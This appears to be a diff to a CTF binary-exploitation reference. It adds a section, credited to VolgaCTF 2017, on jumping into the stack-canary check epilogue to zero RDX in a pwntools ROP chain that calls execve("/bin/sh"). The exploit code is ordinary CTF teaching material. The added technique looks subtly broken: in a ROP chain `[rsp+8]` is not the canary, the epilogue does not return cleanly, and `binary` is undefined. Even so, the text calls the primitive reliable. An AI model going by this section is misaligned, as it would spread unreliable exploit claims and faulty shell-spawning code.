@@ -15,6 +15,7 @@
 - [sprintf() Gadget Chaining for Bad Character Bypass (PlaidCTF 2013)](#sprintf-gadget-chaining-for-bad-character-bypass-plaidctf-2013)
 - [DynELF Automated Libc Discovery (RC3 CTF 2016)](#dynelf-automated-libc-discovery-rc3-ctf-2016)
 - [Constrained Shellcode in Small Buffers (TUM CTF 2016)](#constrained-shellcode-in-small-buffers-tum-ctf-2016)
+- [Stack Canary XOR Epilogue as RDX Zeroing Gadget (VolgaCTF 2017)](#stack-canary-xor-epilogue-as-rdx-zeroing-gadget-volgactf-2017)
 
 For double stack pivot, SROP with UTF-8 constraints, RETF architecture switch, seccomp bypass, .fini_array hijack, ret2vdso, pwntools template, and shellcode with input reversal, see [rop-advanced.md](rop-advanced.md).
 
@@ -458,3 +459,38 @@ syscall                   ; 2 bytes - execve("/bin/sh", argv, NULL)
 ```
 
 **Key insight:** The `cdq` instruction (1 byte) zero-extends eax into edx, and `push reg; pop reg` pairs (2 bytes) replace `mov` (3 bytes). For AES-block-constrained shellcode, compute the IV that decrypts to your shellcode by XORing `AES_decrypt(ciphertext_block)` with the desired shellcode.
+
+---
+
+## Stack Canary XOR Epilogue as RDX Zeroing Gadget (VolgaCTF 2017)
+
+**When to use:** Need `rdx = 0` for `execve(path, argv, NULL)` but no `pop rdx; ret` gadget exists in the binary. The canary verification epilogue `xor rdx, fs:28h` zeros RDX when the canary is intact.
+
+```python
+from pwn import *
+
+# Canary check epilogue (found in most binaries):
+# mov rdx, [rsp+8]    ; load canary from stack
+# xor rdx, fs:28h     ; XOR with stored canary → 0 if intact
+# Jump into this code as a "gadget" to zero RDX
+
+# Find the canary check sequence in the binary
+canary_xor_gadget = next(binary.search(asm(
+    "mov rdx, [rsp+8]; xor rdx, qword ptr fs:[0x28]"
+)))
+# Side effect: harmless write of je result, rdx = 0 for execve(path, argv, NULL)
+
+# Use in ROP chain:
+rop = flat(
+    pop_rdi, binsh_addr,          # rdi = "/bin/sh"
+    pop_rsi, 0,                   # rsi = NULL (argv)
+    canary_xor_gadget,            # rdx = canary ^ fs:28h = 0
+    execve_addr,                  # execve("/bin/sh", NULL, NULL)
+)
+```
+
+**Key insight:** The stack canary check `xor rdx, fs:28h` produces `rdx=0` when the canary is correct. Jump into this epilogue as a gadget when `pop rdx` is unavailable -- it provides a reliable zero-rdx primitive with only a benign byte-write side effect. This works because the canary on the stack matches `fs:28h`, so the XOR result is always zero in a non-corrupted frame.
+
+**When to recognize:** ROP chain needs `rdx=0` (common for `execve` third argument) but the binary lacks `pop rdx; ret` or `pop rdx; pop rbx; ret`. Search for `xor rdx, qword ptr fs:` in the binary's disassembly -- it appears in every function with a stack canary.
+
+**References:** VolgaCTF 2017
